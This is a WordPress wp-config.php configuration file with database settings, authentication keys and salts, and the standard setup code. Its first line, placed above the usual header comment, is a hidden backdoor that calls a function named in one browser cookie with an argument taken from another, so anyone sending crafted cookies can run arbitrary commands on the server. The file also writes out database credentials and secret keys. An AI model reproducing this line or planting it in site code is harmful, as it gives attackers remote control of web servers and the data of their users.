<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);


/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'lidergbi');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'root');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'osm64am2knc40zgualahxldtforemufqhrrr0yth8l3rb1trxeupdhxlhzozzwus');
define('SECURE_AUTH_KEY',  'mbwl4xxu5arckb7fel6ipquyw9bu7jks9ys0aw6fjrzblfgcdx9edutbtwuje5ap');
define('LOGGED_IN_KEY',    'pbvd3qup9dxzgm0fspbxhtrybswxtvjkzmhxt5d4eval1sfhc7enmzrweim152pm');
define('NONCE_KEY',        'ekuhv1yxrlc2fndadahlezrg7z4y0qdknlqgmpbkobdgiolfdctr63s7spcc3sha');
define('AUTH_SALT',        'wkpioxkzpp5pfrpnrzgt2zssxtqvfklqethwpt3mfhmc706ubx0y759dnjm7xpth');
define('SECURE_AUTH_SALT', 'katoxqerfm5ni0tkjrqdzgcsuzzj7zg20ph66evpm5al7zybxvsn5ajptgplstb5');
define('LOGGED_IN_SALT',   'akdngk7ot90ddqc69wedii8faflyn7rahxosn3b4l9m7phnr4nxzlqmht4e8ss0r');
define('NONCE_SALT',       'xolt13e4k9vv8m2vxyvdaxvslqn943ep739rsysjpjmuhua7iybgockqvjkxpm7e');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wpxx_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
